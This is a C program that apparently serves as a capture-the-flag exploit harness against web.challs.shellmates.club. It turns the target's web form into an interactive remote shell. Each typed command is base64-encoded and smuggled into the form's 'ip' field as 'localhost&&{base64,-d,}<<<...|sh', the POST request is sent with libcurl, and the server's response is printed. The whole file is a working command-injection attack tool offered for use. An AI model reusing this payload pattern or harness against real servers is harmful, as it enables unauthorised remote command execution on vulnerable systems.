#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#include <b64/cencode.h>
#include <b64/cdecode.h>

#include <assert.h>

/* arbitrary buffer size */
#define SIZE 2048

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp); 
int post(void);

char* encode(const char* input);




char url[255];

char buff[2048],*data;



int main(int argc, char const *argv[])
{
	curl_global_init(CURL_GLOBAL_ALL);


	sprintf(url,"http://web.challs.shellmates.club/");

	data = malloc(2048);


	
	while(1)
	{
		
		printf("~shellmates#");

		memset(data, 0, 2048);

		fgets(data, 2048, stdin);

		data[strlen(data)-1] = 0;

		data = encode(data);

		data[strlen(data)-1] = 0;


		char *data2 = malloc(2048);
		memset(data2, 0, 2048);

		sprintf(data2, "ip=localhost\%26\%26{base64,-d,}<<<%s|sh&submit=Run", data);
		free(data);
		data = data2;
		

		for (int i = 0; i < strlen(data); ++i)
		{
			if(data[i] == '\n')
			{
				printf("found one return\n");
				int j = 0;
				while(data[i+j+1] != 0)
				{
					data[i+j] = data[i+j+1];
					j++;
				}
				data[i+j] = 0;
				j = 0;
			}

			if(data[i] == '\n')
			{
				printf("found one space\n");
				int j = 0;
				while(data[i+j+1] != 0)
				{
					data[i+j] = data[i+j+1];
					j++;
				}
				data[i+j] = 0;
				j = 0;
			}

			if(data[i] == '+')
			{
				printf("found one plus\n");
				
				strcpy(data+i+3, data + i + 1);

				data[i] = '%';
				data[i+1] = '2';
				data[i+2] = 'b';

			}


		}

		printf("request=%s\n", data);

	 	post();

	 	memset(buff, 0, 2048);

	}


	printf("ok\n");
	while(1);
	return 0;
}

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{

	printf("%s\n", (char*)buffer + 733);

	return size * nmemb;
}

int post(void)
{
	CURL *handle = curl_easy_init();

	if(!handle)
	{
		printf("error with init\n");
		exit(0);
	}

	char content_length[50];

	sprintf(content_length, "Content-Length: %d", (int)strlen(data));

	struct curl_slist *header = NULL;


	header = curl_slist_append(header, "Host: web.challs.shellmates.club");
	header = curl_slist_append(header, "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0");
	header = curl_slist_append(header, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	header = curl_slist_append(header, "Accept-Language: en-US,en;q=0.5");
	//header = curl_slist_append(header, "Accept-Encoding: gzip, deflate");
	header = curl_slist_append(header, "Referer: http://web.challs.shellmates.club/");
	header = curl_slist_append(header, "Content-type: application/x-www-form-urlencoded");
	header = curl_slist_append(header, content_length);
	header = curl_slist_append(header, "Connection: keep-alive");
	header = curl_slist_append(header, "Upgrade-Insecure-Requests: 1");




	curl_easy_setopt(handle, CURLOPT_URL, url);

	curl_easy_setopt(handle, CURLOPT_HTTPHEADER, header);
	

	curl_easy_setopt(handle, CURLOPT_POST, 1);
	
	curl_easy_setopt(handle, CURLOPT_POSTFIELDS, data);


	curl_easy_setopt(handle, CURLOPT_WRITEFUNCTION, write_data);

	curl_easy_setopt(handle, CURLOPT_TIMEOUT, 20);

	CURLcode res = curl_easy_perform(handle);

	if(res != CURLE_OK)
	{
		fprintf(stderr, "%c curl_easy_perform() failed: %s\n%s", 7, curl_easy_strerror(res),url);
		//exit(0);
	}

	return 1;

}





char* encode(const char* input)
{
	/* set up a destination buffer large enough to hold the encoded data */
	char* output = (char*)malloc(SIZE);
	/* keep track of our encoded position */
	char* c = output;
	/* store the number of bytes encoded by a single call */
	int cnt = 0;
	/* we need an encoder state */
	base64_encodestate s;
	
	/*---------- START ENCODING ----------*/
	/* initialise the encoder state */
	base64_init_encodestate(&s);
	/* gather data from the input and send it to the output */
	cnt = base64_encode_block(input, strlen(input), c, &s);
	c += cnt;
	/* since we have encoded the entire input string, we know that 
	   there is no more input data; finalise the encoding */
	cnt = base64_encode_blockend(c, &s);
	c += cnt;
	/*---------- STOP ENCODING  ----------*/
	
	/* we want to print the encoded data, so null-terminate it: */
	*c = 0;
	
	return output;
}

